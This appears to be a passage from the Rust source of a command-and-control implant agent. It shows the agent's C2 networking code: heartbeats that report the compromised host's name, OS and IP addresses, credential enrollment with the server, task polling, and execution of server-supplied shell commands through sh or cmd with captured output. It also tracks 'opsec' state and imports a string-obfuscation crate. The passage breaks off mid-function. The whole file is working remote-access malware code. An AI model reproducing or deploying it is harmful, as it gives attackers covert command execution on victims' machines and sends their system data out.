use crate::auth::{AgentAuth, CredentialSource, CredentialUse, SecretCredential};
use crate::config::{validate_c2_base_url, AgentConfig};
use crate::modules;
use crate::networking::egress::get_egress_ip;
use crate::opsec::{determine_agent_mode, AgentMode};
use crate::tasks::{
    validate_identifier, Task, TaskOutcome, TaskOutput, TaskResult, TaskStatusUpdate, TaskType,
    MAX_TASK_ERROR_CHARS, MAX_TASK_OUTPUT_CHARS, TASK_SCHEMA_VERSION,
};
use crate::util::random_jitter;
use chrono::{DateTime, SecondsFormat, Utc};
use get_if_addrs::get_if_addrs;
use hostname;
use log::{debug, error, info, warn};
use obfstr::obfstr;
use once_cell::sync::Lazy;
use os_info;
use reqwest::{Client, Method, RequestBuilder, Response, StatusCode, Url};
use serde::Deserialize;
use serde_json::{json, Value};
use std::collections::{HashMap, VecDeque};
use std::env;
use std::io::{self, Read};
use std::net::IpAddr;
use std::process::{Command, ExitStatus, Stdio};
use std::sync::mpsc as std_mpsc;
use std::sync::Arc;
use std::sync::Mutex;
use std::time::{Duration, Instant};
use zeroize::Zeroizing;

static TASK_OUTBOX: Lazy<TaskOutbox> = Lazy::new(TaskOutbox::default);

const MAX_CAPTURE_BYTES: usize = MAX_TASK_OUTPUT_CHARS;
const MAX_RESULT_ERROR_CHARS: usize = MAX_TASK_ERROR_CHARS;
const OUTPUT_READ_CHUNK_BYTES: usize = 16 * 1024;
const OUTPUT_CHANNEL_CAPACITY: usize = 16;
const MAX_OUTPUT_EVENTS_PER_TICK: usize = OUTPUT_CHANNEL_CAPACITY * 2;
const MAX_TERMINAL_TASK_IDS: usize = 1_024;
const MAX_HEARTBEAT_RESPONSE_BYTES: usize = 64 * 1024;
const MAX_TASK_RESPONSE_BYTES: usize = 64 * 1024;
const MAX_HEARTBEAT_IP_ENTRIES: usize = 32;
const MAX_HEARTBEAT_NETWORK_FIELD_CHARS: usize = 512;
const MAX_AUTHENTICATED_HEARTBEAT_INTERVAL: Duration = Duration::from_secs(60);

#[derive(Clone, Copy)]
enum C2Endpoint<'a> {
    Heartbeat,
    Tasks,
    Results,
    TaskStatus(&'a str),
}

fn build_c2_endpoint_url(
    server_addr: &str,
    agent_id: &str,
    endpoint: C2Endpoint<'_>,
) -> io::Result<Url> {
    validate_identifier("agent_id", agent_id)
        .map_err(|err| io::Error::new(io::ErrorKind::InvalidInput, err))?;
    if let C2Endpoint::TaskStatus(task_id) = endpoint {
        validate_identifier("task_id", task_id)
            .map_err(|err| io::Error::new(io::ErrorKind::InvalidInput, err))?;
    }

    let mut url = validate_c2_base_url(server_addr)
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;

    let mut segments = url
        .path_segments_mut()
        .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "C2 URL cannot be a base"))?;
    segments
        .pop_if_empty()
        .push("api")
        .push("agent")
        .push(agent_id);

    match endpoint {
        C2Endpoint::Heartbeat => {
            segments.push("heartbeat");
        }
        C2Endpoint::Tasks => {
            segments.push("tasks");
        }
        C2Endpoint::Results => {
            segments.push("results");
        }
        C2Endpoint::TaskStatus(task_id) => {
            segments.push("tasks").push(task_id).push("status");
        }
    }
    drop(segments);

    Ok(url)
}

fn utc_timestamp() -> String {
    Utc::now().to_rfc3339_opts(SecondsFormat::Millis, true)
}

//  Helper function to get current timestamp
fn now_timestamp() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

#[cfg(windows)]
fn create_command(command: &str) -> Command {
    let mut cmd = Command::new("cmd");
    cmd.arg("/C").arg(command);
    cmd
}

#[cfg(not(windows))]
fn create_command(command: &str) -> Command {
    let mut cmd = Command::new("sh");
    cmd.arg("-c").arg(command);
    cmd
}

fn get_all_local_ips() -> Vec<String> {
    get_if_addrs()
        .map(|ifaces| {
            ifaces
                .into_iter()
                .map(|iface| iface.addr.ip().to_string())
                .collect()
        })
        .unwrap_or_default()
}

fn normalized_local_ips(candidates: Vec<String>) -> Vec<String> {
    let mut addresses: Vec<IpAddr> = candidates
        .into_iter()
        .filter_map(|candidate| candidate.parse::<IpAddr>().ok())
        .filter(|address| match address {
            IpAddr::V4(address) => !address.is_loopback() && !address.is_multicast(),
            IpAddr::V6(address) => !address.is_loopback() && !address.is_multicast(),
        })
        .collect();
    addresses.sort_unstable();
    addresses.dedup();
    addresses.truncate(MAX_HEARTBEAT_IP_ENTRIES);
    addresses
        .into_iter()
        .map(|address| address.to_string())
        .collect()
}

#[derive(Clone, Debug, Eq, PartialEq)]
struct ShellExecution {
    stdout: String,
    stderr: String,
    data: Option<Value>,
    exit_code: Option<i32>,
    error: Option<String>,
}

impl ShellExecution {
    fn failed(error: impl Into<String>) -> Self {
        Self {
            stdout: String::new(),
            stderr: String::new(),
            data: None,
            exit_code: None,
            error: Some(error.into()),
        }
    }
}

async fn execute_shell(command: &str, timeout_seconds: u64) -> ShellExecution {
    let deadline = Instant::now() + Duration::from_secs(timeout_seconds);
    let cmd_parts: Vec<&str> = command.split_whitespace().collect();
    if cmd_parts.is_empty() {
        return ShellExecution::failed("shell command is empty");
    }

    if cmd_parts[0] == "cd" {
        let result = if cmd_parts.len() > 1 {
            env::set_current_dir(cmd_parts[1]).and_then(|_| {
                env::current_dir()
                    .map(|current| format!("Changed directory to {}", current.display()))
            })
        } else {
            env::current_dir().map(|current| format!("Current directory: {}", current.display()))
        };

        return match result {
            Ok(stdout) => ShellExecution {
                stdout,
                stderr: String::new(),
                exit_code: Some(0),
                data: None,
                error: None,
            },
            Err(err) => ShellExecution::failed(err.to_string()),
        };
    }

    let mut process = create_command(command);
    process.stdout(Stdio::piped()).stderr(Stdio::piped());
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        process.process_group(0);
    }

    let mut child = match process.spawn() {
        Ok(child) => child,
        Err(err) => return ShellExecution::failed(format!("failed to start command: {err}")),
    };
    let process_tree = ProcessTreeGuard::attach(&child);
    let (output_sender, output_receiver) =
        std_mpsc::sync_channel::<OutputEvent>(OUTPUT_CHANNEL_CAPACITY);
    let mut captured = CapturedOutput::default();

    match child.stdout.take() {
        Some(stdout) => spawn_output_reader(stdout, OutputStream::Stdout, output_sender.clone()),
        None => captured.mark_unavailable(OutputStream::Stdout),
    }
    match child.stderr.take() {
        Some(stderr) => spawn_output_reader(stderr, OutputStream::Stderr, output_sender.clone()),
        None => captured.mark_unavailable(OutputStream::Stderr),
    }
    drop(output_sender);

    let mut exit_status = None;

    loop {
        captured.drain(&output_receiver);

        if exit_status.is_none() {
            match child.try_wait() {
                Ok(Some(status)) => exit_status = Some(status),
                Ok(None) => {}
                Err(err) => {
                    let mut errors = vec![format!("failed to wait for command: {err}")];
                    if let Some(termination_error) = process_tree.terminate(&mut child) {
                        errors.push(termination_error);
                    }
                    captured.drain(&output_receiver);
                    let execution = captured.finish(None, errors);
                    reap_child_detached(child);
                    return execution;
                }
            }
        }

        if exit_status.is_some() && captured.is_complete() {
            let mut errors = Vec::new();
            if let Some(cleanup_error) = process_tree.cleanup_descendants() {
                errors.push(cleanup_error);
            }
            return captured.finish(exit_status, errors);
        }

        let now = Instant::now();
        if now >= deadline {
            let mut errors = vec![format!("command timed out after {timeout_seconds} seconds")];
            if let Some(termination_error) = process_tree.terminate(&mut child) {
                errors.push(termination_error);
            }
            captured.drain(&output_receiver);
            let execution = captured.finish(None, errors);
            reap_child_detached(child);
            return execution;
        }

        tokio::time::sleep((deadline - now).min(Duration::from_millis(10))).await;
    }
}

#[derive(Clone, Copy, Debug)]
enum OutputStream {
    Stdout,
    Stderr,
}

enum OutputEvent {
    Data(OutputStream, Vec<u8>),
    Done(OutputStream),
    Error(OutputStream, String),
}

#[derive(Default)]
struct CapturedOutput {
    stdout: Vec<u8>,
    stderr: Vec<u8>,
    stdout_done: bool,
    stderr_done: bool,
    stdout_truncated: bool,
    stderr_truncated: bool,
    errors: Vec<String>,
}

impl CapturedOutput {
    fn mark_unavailable(&mut self, stream: OutputStream) {
        self.errors
            .push(format!("command {} pipe was unavailable", stream.label()));
        self.mark_done(stream);
    }

    fn mark_done(&mut self, stream: OutputStream) {
        match stream {
            OutputStream::Stdout => self.stdout_done = true,
            OutputStream::Stderr => self.stderr_done = true,
        }
    }

    fn push(&mut self, stream: OutputStream, bytes: &[u8]) {
        let (destination, truncated) = match stream {
            OutputStream::Stdout => (&mut self.stdout, &mut self.stdout_truncated),
            OutputStream::Stderr => (&mut self.stderr, &mut self.stderr_truncated),
        };
        let remaining = MAX_CAPTURE_BYTES.saturating_sub(destination.len());
        let accepted = remaining.min(bytes.len());
        destination.extend_from_slice(&bytes[..accepted]);
        if accepted < bytes.len() {
            *truncated = true;
        }
    }

    fn drain(&mut self, receiver: &std_mpsc::Receiver<OutputEvent>) {
        for _ in 0..MAX_OUTPUT_EVENTS_PER_TICK {
            match receiver.try_recv() {
                Ok(OutputEvent::Data(stream, bytes)) => self.push(stream, &bytes),
                Ok(OutputEvent::Done(stream)) => self.mark_done(stream),
                Ok(OutputEvent::Error(stream, error)) => {
                    self.errors.push(format!(
                        "failed to read command {}: {}",
                        stream.label(),
                        error
                    ));
                    self.mark_done(stream);
                }
                Err(std_mpsc::TryRecvError::Empty) => return,
                Err(std_mpsc::TryRecvError::Disconnected) => {
                    if !self.stdout_done {
                        self.errors
                            .push("command stdout reader stopped unexpectedly".to_string());
                        self.stdout_done = true;
                    }
                    if !self.stderr_done {
                        self.errors
                            .push("command stderr reader stopped unexpectedly".to_string());
                        self.stderr_done = true;
                    }
                    return;
                }
            }
        }
    }

    fn is_complete(&self) -> bool {
        self.stdout_done && self.stderr_done
    }

    fn finish(mut self, status: Option<ExitStatus>, mut errors: Vec<String>) -> ShellExecution {
        errors.append(&mut self.errors);
        if self.stdout_truncated {
            errors.push(format!("stdout truncated at {} bytes", MAX_CAPTURE_BYTES));
        }
        if self.stderr_truncated {
            errors.push(format!("stderr truncated at {} bytes", MAX_CAPTURE_BYTES));
        }

        let exit_code = status.as_ref().and_then(ExitStatus::code);
        if status.as_ref().is_some_and(|status| !status.success()) {
            errors.push(exit_status_error(exit_code));
        }

        let (stdout, stdout_decode_truncated) = decode_bounded_output(&self.stdout);
        let (stderr, stderr_decode_truncated) = decode_bounded_output(&self.stderr);
        if stdout_decode_truncated && !self.stdout_truncated {
            errors.push(format!("stdout truncated at {} bytes", MAX_CAPTURE_BYTES));
        }
        if stderr_decode_truncated && !self.stderr_truncated {
            errors.push(format!("stderr truncated at {} bytes", MAX_CAPTURE_BYTES));
        }

        ShellExecution {
            stdout,
            stderr,
            exit_code,
            data: None,
            error: (!errors.is_empty()).then(|| errors.join("; ")),
        }
    }
}

fn decode_bounded_output(bytes: &[u8]) -> (String, bool) {
    let mut output = String::from_utf8_lossy(bytes).into_owned();
    if output.len() <= MAX_CAPTURE_BYTES {
        return (output, false);
    }

    let mut boundary = MAX_CAPTURE_BYTES;
    while !output.is_char_boundary(boundary) {
        boundary -= 1;
    }
    output.truncate(boundary);
    (output, true)
}

impl OutputStream {
    fn label(self) -> &'static str {
        match self {
            Self::Stdout => "stdout",
            Self::Stderr => "stderr",
        }
    }
}

fn spawn_output_reader<R>(
    mut reader: R,
    stream: OutputStream,
    sender: std_mpsc::SyncSender<OutputEvent>,
) where
    R: Read + Send + 'static,
{
    std::thread::spawn(move || {
        let mut buffer = vec![0u8; OUTPUT_READ_CHUNK_BYTES];
        loop {
            match reader.read(&mut buffer) {
                Ok(0) => {
                    let _ = sender.send(OutputEvent::Done(stream));
                    return;
                }
                Ok(read) => {
                    if sender
                        .send(OutputEvent::Data(stream, buffer[..read].to_vec()))
                        .is_err()
                    {
                        return;
                    }
                }
                Err(err) => {
                    let _ = sender.send(OutputEvent::Error(stream, err.to_string()));
                    return;
                }
            }
        }
    });
}

fn reap_child_detached(mut child: std::process::Child) {
    std::thread::spawn(move || {
        let deadline = Instant::now() + Duration::from_secs(5);
        loop {
            match child.try_wait() {
                Ok(Some(_)) | Err(_) => return,
                Ok(None) if Instant::now() >= deadline => {
                    let _ = child.kill();
                    let _ = child.wait();
                    return;
                }
                Ok(None) => std::thread::sleep(Duration::from_millis(10)),
            }
        }
    });
}

struct ProcessTreeGuard {
    pid: u32,
    #[cfg(windows)]
    job: Option<WindowsJob>,
}

impl ProcessTreeGuard {
    fn attach(child: &std::process::Child) -> Self {
        Self {
            pid: child.id(),
            #[cfg(windows)]
            job: WindowsJob::attach(child).ok(),
        }
    }

    #[cfg(unix)]
    fn process_group_id(&self) -> io::Result<libc::pid_t> {
        let pid = libc::pid_t::try_from(self.pid)
            .map_err(|_| io::Error::other("child PID does not fit in pid_t"))?;
        pid.checked_neg()
            .ok_or_else(|| io::Error::other("child PID cannot identify a process group"))
    }

    #[cfg(unix)]
    fn terminate(&self, child: &mut std::process::Child) -> Option<String> {
        let process_group = match self.process_group_id() {
            Ok(process_group) => process_group,
            Err(group_error) => {
                return match child.kill() {
                    Ok(()) => Some(format!(
                        "failed to identify command process group: {group_error}; terminated direct child"
                    )),
                    Err(child_error) => Some(format!(
                        "failed to identify command process group: {group_error}; direct termination also failed: {child_error}"
                    )),
                };
            }
        };
        // SAFETY: process_group is a checked negative child PID. kill(2)
        // accepts this integer selector and does not dereference memory.
        // foxguard: ignore[rs/unsafe-block]
        let result = unsafe { libc::kill(process_group, libc::SIGKILL) };
        if result == 0 {
            return None;
        }
        let group_error = io::Error::last_os_error();
        if group_error.raw_os_error() == Some(libc::ESRCH) {
            return child.kill().err().map(|error| error.to_string());
        }
        match child.kill() {
            Ok(()) => Some(format!(
                "failed to terminate command process group: {}",
                group_error
            )),
            Err(child_error) => Some(format!(
                "failed to terminate command process group: {}; direct termination also failed: {}",
                group_error, child_error
            )),
        }
    }

    #[cfg(unix)]
    fn cleanup_descendants(&self) -> Option<String> {
        let process_group = match self.process_group_id() {
            Ok(process_group) => process_group,
            Err(error) => return Some(error.to_string()),
        };
        // SAFETY: process_group is a checked negative child PID. kill(2)
        // accepts this integer selector and does not dereference memory.
        // foxguard: ignore[rs/unsafe-block]
        let result = unsafe { libc::kill(process_group, libc::SIGKILL) };
        if result == 0 {
            return None;
        }
        let error = io::Error::last_os_error();
        if error.raw_os_error() == Some(libc::ESRCH) {
            None
        } else {
            Some(format!("failed to clean up command process group: {error}"))
        }
    }

    #[cfg(windows)]
    fn terminate(&self, child: &mut std::process::Child) -> Option<String> {
        if let Some(job) = &self.job {
            if job.terminate().is_ok() {
                return None;
            }
        }
        match terminate_windows_tree_bounded(self.pid) {
            Ok(()) => None,
            Err(tree_error) => match child.kill() {
                Ok(()) => Some(format!(
                    "failed to terminate full command tree: {tree_error}; terminated direct child"
                )),
                Err(child_error) => Some(format!(
                    "failed to terminate full command tree: {tree_error}; direct termination also failed: {child_error}"
                )),
            },
        }
    }

    #[cfg(windows)]
    fn cleanup_descendants(&self) -> Option<String> {
        self.job
            .as_ref()
            .and_then(|job| job.terminate().err())
            .map(|error| format!("failed to clean up command job: {error}"))
    }

    #[cfg(not(any(unix, windows)))]
    fn terminate(&self, child: &mut std::process::Child) -> Option<String> {
        child.kill().err().map(|error| error.to_string())
    }

    #[cfg(not(any(unix, windows)))]
    fn cleanup_descendants(&self) -> Option<String> {
        None
    }
}

#[cfg(windows)]
struct WindowsJob {
    handle: winapi::um::winnt::HANDLE,
}

#[cfg(windows)]
impl WindowsJob {
    fn attach(child: &std::process::Child) -> io::Result<Self> {
        use std::os::windows::io::AsRawHandle;
        use std::{mem, ptr};
        use winapi::shared::minwindef::FALSE;
        use winapi::um::jobapi2::{
            AssignProcessToJobObject, CreateJobObjectW, SetInformationJobObject,
        };
        use winapi::um::winnt::{
            JobObjectExtendedLimitInformation, HANDLE, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
            JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
        };

        // SAFETY: null security-attribute and name pointers request Windows
        // defaults. The returned handle is checked before use and owned here.
        // foxguard: ignore[rs/unsafe-block]
        let handle: HANDLE = unsafe { CreateJobObjectW(ptr::null_mut(), ptr::null()) };
        if handle.is_null() {
            return Err(io::Error::last_os_error());
        }
        // SAFETY: this Win32 information structure is plain data and Windows
        // requires every field to start at zero before selected flags are set.
        // foxguard: ignore[rs/unsafe-block]
        let mut limits: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = unsafe { mem::zeroed() };
        limits.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
        // SAFETY: handle is non-null and owned, limits is initialized, and the
        // pointer and byte count describe exactly one limits structure.
        // foxguard: ignore[rs/unsafe-block]
        let configured = unsafe {
            SetInformationJobObject(
                handle,
                JobObjectExtendedLimitInformation,
                &mut limits as *mut JOBOBJECT_EXTENDED_LIMIT_INFORMATION as *mut _,
                mem::size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
            )
        };
        if configured == FALSE {
            let error = io::Error::last_os_error();
            // SAFETY: handle is the non-null owned handle created above and is
            // closed exactly once on this error path.
            // foxguard: ignore[rs/unsafe-block]
            unsafe {
                winapi::um::handleapi::CloseHandle(handle);
            }
            return Err(error);
        }
        // SAFETY: handle remains valid and child.as_raw_handle() is borrowed
        // only for the duration of this synchronous Win32 call.
        // foxguard: ignore[rs/unsafe-block]
        let assigned = unsafe { AssignProcessToJobObject(handle, child.as_raw_handle() as HANDLE) };
        if assigned == FALSE {
            let error = io::Error::last_os_error();
            // SAFETY: handle is the non-null owned handle created above and is
            // closed exactly once on this error path.
            // foxguard: ignore[rs/unsafe-block]
            unsafe {
                winapi::um::handleapi::CloseHandle(handle);
            }
            return Err(error);
        }
        Ok(Self { handle })
    }

    fn terminate(&self) -> io::Result<()> {
        use winapi::shared::minwindef::FALSE;
        use winapi::um::jobapi2::TerminateJobObject;

        // SAFETY: self.handle is a live job handle owned by self for the
        // duration of this call.
        // foxguard: ignore[rs/unsafe-block]
        if unsafe { TerminateJobObject(self.handle, 1) } == FALSE {
            return Err(io::Error::last_os_error());
        }
        Ok(())
    }
}

#[cfg(windows)]
impl Drop for WindowsJob {
    fn drop(&mut self) {
        // SAFETY: self owns the non-null job handle and Drop runs once.
        // foxguard: ignore[rs/unsafe-block]
        unsafe {
            winapi::um::handleapi::CloseHandle(self.handle);
        }
    }
}

#[cfg(windows)]
fn terminate_windows_tree_bounded(pid: u32) -> io::Result<()> {
    let mut killer = Command::new("taskkill")
        .args(["/PID", &pid.to_string(), "/T", "/F"])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()?;
    let deadline = Instant::now() + Duration::from_secs(1);
    loop {
        match killer.try_wait()? {
            Some(status) if status.success() => return Ok(()),
            Some(status) => {
                return Err(io::Error::other(format!(
                    "taskkill exited with status {:?}",
                    status.code()
                )))
            }
            None if Instant::now() >= deadline => {
                let _ = killer.kill();
                return Err(io::Error::new(
                    io::ErrorKind::TimedOut,
                    "taskkill exceeded its one-second bound",
                ));
            }
            None => std::thread::sleep(Duration::from_millis(10)),
        }
    }
}

fn exit_status_error(exit_code: Option<i32>) -> String {
    match exit_code {
        Some(code) => format!("command exited with status {code}"),
        None => "command terminated without an exit code".to_string(),
    }
}

//  Update C2 failure tracking to use new accessor pattern
fn update_c2_failure_state(success: bool) {
    use crate::opsec::with_opsec_state_mut;

    with_opsec_state_mut(|state| {
        if success {
            if state.consecutive_c2_failures > 0 {
                state.consecutive_c2_failures = 0;
                info!("[OPSEC C2] C2 communication restored, reset failure counter");
            }
        } else {
            state.consecutive_c2_failures = state.consecutive_c2_failures.saturating_add(1);
            warn!(
                "[OPSEC C2] C2 communication failed, consecutive failures: {}",
                state.consecutive_c2_failures
            );
        }
    });
}

//  Add function to mark noisy command executed
fn mark_noisy_command_executed() {
    use crate::opsec::with_opsec_state_mut;

    with_opsec_state_mut(|state| {
        state.last_noisy_command_time = Some(now_timestamp()); //  Use timestamp instead of Instant
    });
}

#[derive(Deserialize)]
struct HeartbeatResponse {
    #[serde(default)]
    session_credential: Option<String>,
}

fn build_c2_client(config: &AgentConfig, server_addr: &str) -> io::Result<Client> {
    let requested = config
        .validate_transport_policy(server_addr)
        .map_err(|err| io::Error::new(io::ErrorKind::InvalidInput, err))?;
    let configured = config
        .get_validated_server_url()
        .map_err(|err| io::Error::new(io::ErrorKind::InvalidInput, err))?;
    if requested != configured {
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "runtime C2 destination differs from the embedded configuration",
        ));
    }
    config.build_http_client()
}

fn authorize_request(request: RequestBuilder, credential: &CredentialUse) -> RequestBuilder {
    request.bearer_auth(credential.credential.expose())
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
enum HeartbeatAttempt {
    Accepted,
    Unauthorized,
}

async fn read_bounded_response_body(
    mut response: Response,
    maximum_bytes: usize,
    response_name: &str,
) -> io::Result<Vec<u8>> {
    if response
        .content_length()
        .is_some_and(|length| length > maximum_bytes as u64)
    {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            format!("{response_name} response exceeds the supported size"),
        ));
    }

    let mut body = Vec::new();
    while let Some(chunk) = response.chunk().await.map_err(io::Error::other)? {
        if body.len().saturating_add(chunk.len()) > maximum_bytes {
            return Err(io::Error::new(
                io::ErrorKind::InvalidData,
                format!("{response_name} response exceeds the supported size"),
            ));
        }
        body.extend_from_slice(&chunk);
    }
    Ok(body)
}

async fn send_heartbeat_once(
    config: &AgentConfig,
    server_addr: &str,
    agent_id: &str,
    auth: &AgentAuth,
    credential: &CredentialUse,
    expected_prior_session: Option<&SecretCredential>,
) -> io::Result<HeartbeatAttempt> {
    let url = build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Heartbeat)?;
    info!(
        "[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})",
        url, config.socks5_enabled
    );
    let client = build_c2_client(config, server_addr)?;

    let os = os_info::get();
    let hostname = hostname::get()?.to_string_lossy().to_string();
    let ip_list = get_all_local_ips();
    let egress_ip = get_egress_ip(server_addr);

    let data = build_heartbeat_payload(
        config,
        agent_id,
        os.os_type().to_string(),
        hostname,
        ip_list,
        egress_ip,
    );

    match authorize_request(client.request(Method::POST, url), credential)
        .json(&data)
        .send()
        .await
    {
        Ok(response) => {
            let status = response.status();
            info!(
                "[HTTP] Heartbeat response: {} (SOCKS5 enabled: {})",
                status, config.socks5_enabled
            );
            if status == StatusCode::UNAUTHORIZED {
                return Ok(HeartbeatAttempt::Unauthorized);
            }
            if !status.is_success() {
                error!("[HTTP] Heartbeat failed with status: {}", status);
                return Err(io::Error::other(format!(
                    "heartbeat failed with status {status}"
                )));
            }
            let body = Zeroizing::new(
                read_bounded_response_body(response, MAX_HEARTBEAT_RESPONSE_BYTES, "heartbeat")
                    .await?,
            );
            if !body.is_empty() {
                let response: HeartbeatResponse = serde_json::from_slice(&body).map_err(|err| {
                    io::Error::new(
                        io::ErrorKind::InvalidData,
                        format!("invalid heartbeat response JSON: {err}"),
                    )
                })?;
                if let Some(session_credential) = response.session_credential {
                    match credential.source {
                        CredentialSource::Bootstrap => auth.persist_bootstrap_session(
                            session_credential,
                            expected_prior_session,
                        )?,
                        CredentialSource::Session => {
                            debug_assert!(expected_prior_session.is_none());
                            auth.persist_session(session_credential)?;
                        }
                    }
                }
            }
            Ok(HeartbeatAttempt::Accepted)
        }
        Err(e) => {
            error!("[HTTP] Heartbeat POST failed: {}", e);
            Err(io::Error::other(e))
        }
    }
}

async fn bootstrap_enrollment(
    config: &AgentConfig,
    server_addr: &str,
    agent_id: &str,
    auth: &AgentAuth,
    expected_prior_session: Option<&SecretCredential>,
) -> io::Result<()> {
    let bootstrap = auth.bootstrap_credential()?;
    match send_heartbeat_once(
        config,
        server_addr,
        agent_id,
        auth,
        &bootstrap,
        expected_prior_session,
    )
    .await?
    {
        HeartbeatAttempt::Accepted => Ok(()),
        HeartbeatAttempt::Unauthorized => Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "bootstrap enrollment was rejected",
        )),
    }
}

async fn recover_authentication(
    config: &AgentConfig,
    server_addr: &str,
    agent_id: &str,
    auth: &AgentAuth,
) -> io::Result<()> {
    let current = auth.active_credential()?;
    if current.source == CredentialSource::Session
        && matches!(
            send_heartbeat_once(config, server_addr, agent_id, auth, &current, None).await,
            Ok(HeartbeatAttempt::Accepted)
        )
    {
        return Ok(());
    }
    let expected_prior_session =
        (current.source == CredentialSource::Session).then_some(&current.credential);
    bootstrap_enrollment(config, server_addr, agent_id, auth, expected_prior_session).await
}

async fn send_authenticated_request<F>(
    config: &AgentConfig,
    server_addr: &str,
    agent_id: &str,
    auth: &AgentAuth,
    build_request: F,
) -> io::Result<Response>
where
    F: Fn(&Client) -> RequestBuilder,
{
    let client = build_c2_client(config, server_addr)?;
    let credential = match auth.session_credential() {
        Some(credential) => credential,
        None => {
            bootstrap_enrollment(config, server_addr, agent_id, auth, None).await?;
            auth.session_credential().ok_or_else(|| {
                io::Error::new(
                    io::ErrorKind::PermissionDenied,
                    "heartbeat enrollment did not provide a session credential",
                )
            })?
        }
    };
    let response = authorize_request(build_request(&client), &credential)
        .send()
        .await
        .map_err(io::Error::other)?;
    if response.status() != StatusCode::UNAUTHORIZED {
        return Ok(response);
    }

    recover_authentication(config, server_addr, agent_id, auth).await?;
    let refreshed = auth.session_credential().ok_or_else(|| {
        io::Error::new(
            io::ErrorKind::PermissionDenied,
            "authentication recovery did not provide a session credential",
        )
    })?;
    authorize_request(build_request(&client), &refreshed)
        .send()
        .await
        .map_err(io::Error::other)
}

// Send a heartbeat using the current session, or enroll with the bootstrap
// credential when no durable session exists.
pub async fn send_heartbeat_with_client(
    config: &AgentConfig,
    server_addr: &str,
    agent_id: &str,
    auth: &AgentAuth,
) -> io::Result<()> {
    let current = auth.active_credential()?;
    let result = send_heartbeat_once(config, server_addr, agent_id, auth, &current, None).await;
    let result = match result {
        Ok(HeartbeatAttempt::Accepted) => Ok(()),
        Ok(HeartbeatAttempt::Unauthorized) if current.source == CredentialSource::Session => {
            bootstrap_enrollment(
                config,
                server_addr,
                agent_id,
                auth,
                Some(&current.credential),
            )
            .await
        }
        Ok(HeartbeatAttempt::Unauthorized) => Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "heartbeat authentication was rejected",
        )),
        Err(err) => Err(err),
    };
    update_c2_failure_state(result.is_ok());
    result
}

fn build_heartbeat_payload(
    config: &AgentConfig,
    agent_id: &str,
    os: String,
    hostname: String,
    ip_list: Vec<String>,
    egress_ip: String,
) -> Value {
    let ip_list = normalized_local_ips(ip_list);
    let ip = ip_list
        .first()
        .cloned()
        .unwrap_or_else(|| "Unknown".to_string());
    debug_assert!(ip.chars().count() <= MAX_HEARTBEAT_NETWORK_FIELD_CHARS);
    json!({
        "id": agent_id,
        "payload_id": config.payload_id,
        "listener_id": config.listener_id,
        "os": os,
        "hostname": hostname,
        "ip": ip,
        "ip_list": ip_list,
        "egress_ip": egress_ip,
        "commands": Vec::<String>::new(),
        "module_ids": modules::registered_module_ids()
    })
}

// Fetch one typed task from the server.
async fn get_task_with_client(
    config: &AgentConfig,
    server_addr: &str,
    agent_id: &str,
    auth: &AgentAuth,
) -> io::Result<Option<Task>> {
    let url = build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Tasks)?;
    info!(
        "[HTTP] Sending task GET to {} (SOCKS5 enabled: {})",
        url, config.socks5_enabled
    );
    match send_authenticated_request(config, server_addr, agent_id, auth, |client| {
        client.request(Method::GET, url.clone())
    })
    .await
    {
        Ok(response) => {
            info!(
                "[HTTP] Task GET response: {} (SOCKS5 enabled: {})",
                response.status(),
                config.socks5_enabled
            );
            if response.status() == StatusCode::NO_CONTENT {
                update_c2_failure_state(true);
                return Ok(None);
            }
            if response.status().is_success() {
                let body =
                    read_bounded_response_body(response, MAX_TASK_RESPONSE_BYTES, "task").await;
                match body.and_then(|body| {
                    serde_json::from_slice::<Task>(&body).map_err(|err| {
                        io::Error::new(
                            io::ErrorKind::InvalidData,
                            format!("invalid task JSON: {err}"),
                        )
                    })
                }) {
                    Ok(task) => {
                        if let Err(err) = task.validate_for_agent(agent_id) {
                            error!("[HTTP] Rejected invalid task: {}", err);
                            update_c2_failure_state(false);
                            return Err(io::Error::new(io::ErrorKind::InvalidData, err));
                        }
                        update_c2_failure_state(true);
                        Ok(Some(task))
                    }
                    Err(err) => {
                        error!("[HTTP] Failed to parse task response JSON: {}", err);
                        update_c2_failure_state(false);
                        Err(err)
                    }
                }
            } else {
                error!(
                    "[HTTP] Task fetch failed with status: {}",
                    response.status()
                );
                update_c2_failure_state(false);
                Err(io::Error::other(format!(
                    "task fetch failed with status {}",
                    response.status()
                )))
            }
        }
        Err(err) => {
            error!("[HTTP] Task GET failed: {}", err);
            update_c2_failure_state(false);
            Err(io::Error::other(err))
        }
    }
}

async fn submit_running_status_with_client(
    config: &AgentConfig,
    server_addr: &str,
    agent_id: &str,
    auth: &AgentAuth,
    task: &Task,
    started_at: &str,
) -> SubmissionOutcome {
    let url = match build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::TaskStatus(&task.id)) {
        Ok(url) => url,
        Err(err) => return SubmissionOutcome::Permanent(err.to_string()),
    };
    let update = TaskStatusUpdate::running(task, started_at.to_string());
    if let Err(err) = update.validate() {
        return SubmissionOutcome::Permanent(err.to_string());
    }
    info!(
        "[HTTP] Sending running status POST to {} (SOCKS5 enabled: {})",
        url, config.socks5_enabled
    );
    match send_authenticated_request(config, server_addr, agent_id, auth, |client| {
        client.request(Method::POST, url.clone()).json(&update)
    })
    .await
    {
        Ok(response) => {
            info!(
                "[HTTP] Running status POST response: {} (SOCKS5 enabled: {})",
                response.status(),
                config.socks5_enabled
            );
            let outcome = classify_submission_status(response.status(), "running status");
